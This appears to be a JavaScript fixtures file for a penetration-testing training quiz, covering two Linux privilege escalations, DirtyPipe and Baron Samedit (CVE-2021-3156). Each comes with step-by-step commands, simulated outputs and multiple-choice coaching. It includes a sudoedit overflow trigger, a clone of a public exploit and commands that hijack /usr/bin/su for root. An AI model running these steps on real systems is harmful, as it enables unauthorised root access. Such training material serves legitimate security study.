      "teach": "The kernel is 5.10.0, inside the 5.8 to 5.16.11 range, so DirtyPipe applies. Compile the exploit and point it at a SUID binary like /usr/bin/su for a root shell.",
      "leadup": [
        {
          "key": "kernel",
          "label": "The kernel is 5.8 to 5.16.11",
          "steps": [
            {
              "title": "Read the kernel version",
              "tool": "cmd",
              "where": "target",
              "cmd": "uname -r",
              "out": "5.10.0-11-amd64",
              "sig": "5.10.0",
              "teach": "The vulnerable window is 5.8 through 5.16.11."
            }
          ]
        },
        {
          "key": "shell",
          "label": "You have a Linux foothold",
          "steps": [
            {
              "title": "Confirm your unprivileged shell",
              "tool": "cmd",
              "where": "target",
              "cmd": "id",
              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
              "sig": "uid=1000(bob)",
              "teach": "DirtyPipe is a local escalation, so a foothold comes first."
            }
          ]
        }
      ],
      "how": {
        "lead": "DirtyPipe is confirm the kernel is 5.8 to 5.16.11, compile the PoC, point it at a SUID binary, take root.",
        "items": [
          {
            "t": "Check the kernel",
            "d": "uname -r names the kernel; DirtyPipe applies from 5.8 through 5.16.11.",
            "demo": [
              {
                "run": "uname -r",
                "out": "5.10.0-11-amd64",
                "sig": "5.10.0"
              }
            ],
            "note": "Outside that range DirtyPipe does not apply."
          },
          {
            "t": "Compile on the target",
            "d": "Build the staged exploit on the box, or compile for the same architecture and transfer it.",
            "demo": [
              {
                "run": "gcc dirtypipe.c -o /tmp/dp",
                "out": "dirtypipe.c compiled to /tmp/dp",
                "sig": "/tmp/dp"
              }
            ],
            "note": "No warnings needed; the exploit is small and self-contained."
          },
          {
            "t": "Hijack a SUID binary",
            "d": "Point the exploit at a SUID binary; it rewrites it, drops you to root, and restores it.",
            "demo": [
              {
                "run": "/tmp/dp /usr/bin/su",
                "out": "Backing up /usr/bin/su, restoring after\nroot@box:/#",
                "sig": "root@box"
              }
            ],
            "note": "The original binary is restored afterwards, so the box keeps working."
          }
        ]
      },
      "situation": "You have a shell on Linux and uname -r shows 5.10.0-11-amd64. What is the move?",
      "choices": [
        "dirtypipe",
        "dirtycow",
        "linux-kernel-exploit",
        "cron-abuse"
      ],
      "coach": {
        "dirtycow": "DirtyCow is for kernels below 4.8.3; 5.10 is in the DirtyPipe window instead.",
        "linux-kernel-exploit": "That is the general method; the exact version points at DirtyPipe.",
        "cron-abuse": "A cron path is a fine parallel lead; the kernel version makes DirtyPipe the direct exploit."
      }
    },
    "baron-samedit": {
      "why": "Baron Samedit is a heap overflow inside sudo itself, present on sudo below 1.9.5p2. It is reached through sudoedit before sudo checks whether you are allowed to run anything, so any local user can trigger it regardless of their sudo rights, even a user who sudo -l says can do nothing. A public exploit auto-detects the memory layout for the target and spawns a root shell. It is a post-foothold escalation and a reliable fallback when the obvious sudo and SUID paths are closed. Confirm the sudo version, then run the exploit.",
      "cmd": "sudo --version | head -1",
      "tool": "cmd",
      "output": "Sudo version 1.8.31",
      "signal": "1.8.31",
      "teach": "sudo is 1.8.31, below the 1.9.5p2 fix, so Baron Samedit applies. Run the exploit; it needs no sudo rights of your own and auto-detects the offsets.",
      "leadup": [
        {
          "key": "version",
          "label": "sudo is below 1.9.5p2",
          "steps": [
            {
              "title": "Read the sudo version",
              "tool": "cmd",
              "where": "target",
              "cmd": "sudo --version | head -1",
              "out": "Sudo version 1.8.31",
              "sig": "1.8.31",
              "teach": "Below 1.9.5p2 is vulnerable, and your own sudo rights do not matter."
            }
          ]
        },
        {
          "key": "crash",
          "label": "A crash test confirms it",
          "steps": [
            {
              "title": "Trigger the overflow safely",
              "tool": "cmd",
              "where": "target",
              "cmd": "sudoedit -s '' $(perl -e 'print \"A\" x 1000')",
              "out": "malloc(): corrupted top size\nSegmentation fault",
              "sig": "Segmentation fault",
              "teach": "A crash from the overflow test confirms the vulnerable code path before you run the full exploit."
            }
          ]
        }
      ],
      "how": {
        "lead": "Baron Samedit is confirm sudo is below 1.9.5p2, clone the exploit, run it, and take the root shell it spawns.",
        "items": [
          {
            "t": "Check the sudo version",
            "d": "sudo --version reports the version; below 1.9.5p2 is vulnerable.",
            "demo": [
              {
                "run": "sudo --version | head -1",
                "out": "Sudo version 1.8.31",
                "sig": "1.8.31"
              }
            ],
            "note": "Your own sudo rights do not matter; the bug is reached before the permission check."
          },
          {
            "t": "Get the exploit",
            "d": "The worawit version auto-detects the right offsets for common targets.",
            "demo": [
              {
                "run": "git clone https://github.com/worawit/CVE-2021-3156",
                "out": "Cloning into 'CVE-2021-3156'...",
                "sig": "CVE-2021-3156"
              }
            ],
            "note": "Other PoCs need the exact libc or distro offsets, which is more fragile."
          },
          {
            "t": "Run it and take root",
            "d": "Run the exploit; it spawns a root shell directly.",
            "demo": [
              {
                "run": "python3 CVE-2021-3156/exploit_nss.py",
                "out": "# id\nuid=0(root) gid=0(root) groups=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "Capture proof; the shell is root with no password prompt."
          }
        ]
      },
      "situation": "You have a shell on Linux, sudo -l shows nothing useful, and sudo --version reports 1.8.31. What is the move?",
      "choices": [
        "baron-samedit",
        "sudo-abuse",
        "dirtypipe",
        "suid-gtfobins"
      ],
      "coach": {
        "sudo-abuse": "sudo -l gave you nothing, but Baron Samedit does not need any sudo rights; the version alone is the lever.",
        "dirtypipe": "A kernel path is a parallel option; the sudo version here points straight at Baron Samedit.",
        "suid-gtfobins": "Worth a look, but the vulnerable sudo is a direct root with no special SUID binary needed."
      }
    }
  };
  Object.keys(GAPFILL5G).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5G[k]; });

})(typeof globalThis !== 'undefined' ? globalThis : this);
